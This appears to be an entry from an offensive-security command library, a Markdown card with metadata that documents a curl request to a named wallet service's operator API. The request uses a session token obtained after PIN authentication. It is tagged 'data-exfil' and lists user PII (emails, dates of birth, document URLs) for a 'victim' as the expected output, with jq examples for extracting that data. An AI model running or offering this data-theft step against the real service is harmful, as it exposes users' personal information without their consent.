---
id: cmd-curl-wallet-query-001
name: curl-wallet-query
type: command
executor: bash
data: >-
  curl -X GET https://api.romit.io/v0/wallet/operator -H "Authorization: Bearer
  <session_token_from_pin>"
output: >-
  {"users":[{"email":"victim@example.com","dob":"1990-01-01","documents":["https://doc.url"]
  }]}
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.182Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api-query
  - data-exfil
verified: false
validated: true
submitted: true
---

# curl-wallet-query

## Command

```bash
curl -X GET https://api.romit.io/v0/wallet/operator -H "Authorization: Bearer <session_token_from_pin>"
```

## Description

This curl command queries the operator wallet API to retrieve added user profiles, including PII, using the session token from successful PIN authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method for retrieval | Yes |
| `-H "Authorization: Bearer <session_token_from_pin>"` | Auth header with post-PIN token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET https://api.romit.io/v0/wallet/operator -H "Authorization: Bearer eyJ..."
```

### Advanced Usage

Pipe to jq for parsing:

```bash
curl ... | jq '.users[] | {email, dob}'
```

## Expected Output

JSON array of users with PII fields like email, DOB, and document URLs.

## Related

- [[Related Procedure: Access-Disclosed-User-Information-from-Operator-Wallet]]
